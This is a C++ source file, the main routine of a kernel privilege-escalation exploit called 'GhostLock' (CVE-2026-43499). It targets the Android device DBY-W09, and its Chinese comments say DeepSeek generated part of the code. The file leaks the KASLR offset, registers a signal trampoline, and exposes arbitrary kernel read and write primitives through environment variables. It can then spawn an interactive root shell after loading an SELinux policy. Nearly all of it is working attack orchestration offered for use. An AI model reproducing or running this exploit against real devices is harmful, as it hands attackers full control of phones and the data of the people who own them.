// 部分代码由deepseek生成
// GhostLock（CVE-2026-43499）for DBY-W09
#include <algorithm>
#include <sys/types.h>
#include <cerrno>
#include <csignal>
#include <fstream>
#include "tools.h"
#include "const.h"
#include "prim/prim.h"
#include "selinux/const.h"
#include "signal/sig_handler.h"
using std::string, std::cout, std::endl;

int main() {
    Print print("main");
    ptime();
    print("程序运行开始");
    //安卓环境强制启用PAD方案，防止忘记传PAD=1
    if (access("/system/build.prop", F_OK) == 0) {
        setenv("PAD", "1", 1);
    }
    //泄露KASLR偏移
    if (auto slide = getenv("SLIDE")) {
        kaslr_slide = std::stoul(slide, nullptr, 16);
        print("用户给定slide=",kaslr_slide," 跳过KASLR偏移泄露");
    } else leak_slide();
    init_addrs(); //设置函数地址
    //注册信号handler
    struct sigaction sa{};
    sa.sa_sigaction = (void (*)(int, siginfo_t *, void *))l11_tramp;
    sa.sa_flags     = SA_SIGINFO | SA_ONSTACK;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, nullptr) != 0) {
        print("信号 handler 注册失败");
        return 1;
    }

    const char *RL = getenv("READ_LINK"), *WL = getenv("WRITE_LINK"),
    *N = getenv("N"), *V = getenv("V"), *W = getenv("W");
    //读原语
    if (RL && N && W) {
        unsigned long rl = std::stoul(RL, nullptr, 16), n = std::stoul(N), w = std::stoul(W);
        std::vector<unsigned long> data;
        Prim::getInstance().read_link(rl, data, n, w);
        print("给定地址读取结果：");
        cout << std::hex;
        for (auto &e: data) {
            cout << e << ' ';
        }
        cout << endl;
        cout << std::dec;
    }
    //写原语
    else if (WL && V && W) {
        unsigned long wl = std::stoul(WL, nullptr, 16), v = std::stoul(V, nullptr, 16), w = std::stoul(W);
        Prim::getInstance().write_link(wl, v, w);
        print("写入目标地址完成");
    }
    //交互式root shell
    else if (getenv("ROOTSHELL")) load_policy_then_root();
    //读写原语自校验
    else selfCheck();
}